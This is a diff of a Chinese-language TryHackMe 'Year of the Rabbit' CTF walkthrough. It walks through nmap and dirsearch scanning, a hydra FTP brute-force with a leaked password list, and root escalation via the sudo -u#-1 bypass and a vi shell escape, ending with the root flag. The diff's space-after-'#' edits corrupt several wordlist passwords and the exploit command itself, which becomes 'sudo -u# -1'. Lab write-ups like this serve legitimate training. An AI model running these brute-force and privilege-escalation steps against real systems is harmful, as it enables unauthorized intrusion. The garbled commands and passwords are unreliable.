@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ──(root💀kali)-[~/tryhackme/yearofrabbit]
-└─# nmap -sV -Pn 10.10.17.116           
+└─#  nmap -sV -Pn 10.10.17.116           
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 01:45 EDT
 Nmap scan report for 10.10.17.116
@@ -21,10 +21,10 @@ Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
 
 
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100 -u http://10.10.17.116
+└─#  python3 dirsearch.py -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100 -u http://10.10.17.116
 
  _|. _ _  _  _  _ _|_    v0.3.8                                                                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
@@ -126,12 +126,12 @@ u6oY9?nHv84D&
 TS*%miyPsGV54
 C77O3FIy0c0sd
 O14xEhgg0Hxz1
-5dpv#Pr$wqH7F
+5dpv# Pr$wqH7F
 1G8Ucoce1+gS5
 0plnI%f0~Jw71
 0kLoLzfhqq8u&
 kS9pn5yiFGj6d
-zeff4#!b5Ib_n
+zeff4# !b5Ib_n
 rNT4E4SHDGBkl
 KKH5zy23+S0@B
 3r6PHtM4NzJjE
@@ -142,7 +142,7 @@ PYKt-ebvtmWoC
 3TN%cD_E6zm*s
 eo?@c!ly3&=0Z
 nR8&FXz$ZPelN
-eE4Mu53UkKHx#
+eE4Mu53UkKHx# 
 86?004F9!o49d
 SNGY0JjA5@0EE
 trm64++JZ7R6E
@@ -153,20 +153,20 @@ A-*eE3L@!4W5o
 GoM^$82l&GA5D
 1t$4$g$I+V_BH
 0XxpTd90Vt8OL
-j0CN?Z#8Bp69_
-G#h~9@5E5QA5l
+j0CN?Z# 8Bp69_
+G# h~9@5E5QA5l
 DRWNM7auXF7@j
 Fw!if_=kk7Oqz
 92d5r$uyw!vaE
 c-AA7a2u!W2*?
-zy8z3kBi#2e36
+zy8z3kBi# 2e36
 J5%2Hn+7I6QLt
 gL$2fmgnq8vI*
 Etb?i?Kj4R=QM
 7CabD7kwY7=ri
 4uaIRX~-cY6K4
 kY1oxscv4EB2d
-k32?3^x1ex7#o
+k32?3^x1ex7# o
 ep4IPQ_=ku@V8
 tQxFJ909rd1y2
 5L6kpPR5E2Msn
@@ -177,7 +177,7 @@ ki^t!+uqB?DyI
 5iez1wGXKfPKQ
 nJ90XzX&AnF5v
 7EiMd5!r%=18c
-wYyx6Eq-T^9#@
+wYyx6Eq-T^9# @
 yT2o$2exo~UdW
 ZuI-8!JyI6iRS
 PTKM6RsLWZ1&^
@@ -192,7 +192,7 @@ NIZ2D%d58*v@R
 0rJ7p%6Axm05K
 94rU30Zx45z5c
 Vi^Qf+u%0*q_S
-1Fvdp&bNl3#&l
+1Fvdp&bNl3# &l
 zLH%Ot0Bw&c%9
 
 ```
@@ -200,7 +200,7 @@ zLH%Ot0Bw&c%9
 ftp服务的用户名是：```ftpuser```,密码是下面期中一个。把密码保存为passwd.txt，爆破ftp
 ```
 ┌──(root💀kali)-[~/tryhackme/yearofrabbit]
-└─# hydra -l ftpuser -P /root/tryhackme/yearofrabbit/passwd.txt 10.10.17.116 ftp        
+└─#  hydra -l ftpuser -P /root/tryhackme/yearofrabbit/passwd.txt 10.10.17.116 ftp        
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-27 05:45:29
@@ -212,10 +212,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-27 05:45:
 
 ```
 
-#登录ftp,把文件下载到本地
+# 登录ftp,把文件下载到本地
 ```
 ┌──(root💀kali)-[~/tryhackme/yearofrabbit]
-└─# ftp 10.10.17.116
+└─#  ftp 10.10.17.116
 Connected to 10.10.17.116.
 220 (vsFTPd 3.0.2)
 Name (10.10.17.116:root): ftpuser
@@ -239,11 +239,11 @@ ftp> exit
 221 Goodbye.
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/yearofrabbit]
-└─# ls
+└─#  ls
  aliIOS  "Eli's_Creds.txt"   Hot_Babe.png   _Hot_Babe.png.extracted   passwd.txt   RickRolled.mp4
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/yearofrabbit]
-└─# cat "Eli's_Creds.txt" 
+└─#  cat "Eli's_Creds.txt" 
 +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
 --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
 ++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
@@ -286,14 +286,14 @@ drwxr-xr-x  2 gwendoline gwendoline 4.0K Jan 23  2020 gwendoline
 
 也就是我们需要横向提权到```gwendoline```用户
 
-#再次登录eli账号的时候收到了这条信息
+# 再次登录eli账号的时候收到了这条信息
 >1 new message
 >Message from Root to Gwendoline:
 >"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
 >END MESSAGE
 
 
-#查找s3cr3t相关信息
+# 查找s3cr3t相关信息
 ```
 find / -name s3cr3t
 /usr/games/s3cr3t
@@ -340,14 +340,14 @@ User gwendoline may run the following commands on year-of-the-rabbit:
 All表示本账号可以用任何人的身份运行这条命令
 !root表示本账号不是root账号
 
-此时如果我们用```sudo -u#-1```即可使用```root```权限运行这条命令，因为-u#-1返回的是一个0值，也就是root的id值
+此时如果我们用```sudo -u# -1```即可使用```root```权限运行这条命令，因为-u# -1返回的是一个0值，也就是root的id值
 
 以上参考[这篇文章](https://www.exploit-db.com/exploits/47502)
 
 按照[gtfobins](https://gtfobins.github.io/gtfobins/vi/)里vi提权的方法，
 1，我们可以先用vi命令打开这个文件
 
-```sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt```
+```sudo -u# -1 /usr/bin/vi /home/gwendoline/user.txt```
 2，输入
 ```
 :set shell=/bin/sh
@@ -360,11 +360,11 @@ All表示本账号可以用任何人的身份运行这条命令
 即可提升到root权限
 
 ```
-gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -u# -1 /usr/bin/vi /home/gwendoline/user.txt
 
-# id
+#  id
 uid=0(root) gid=0(root) groups=0(root)
-# cat /root/root.txt
+#  cat /root/root.txt
 THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
-# 
+#  
 ```
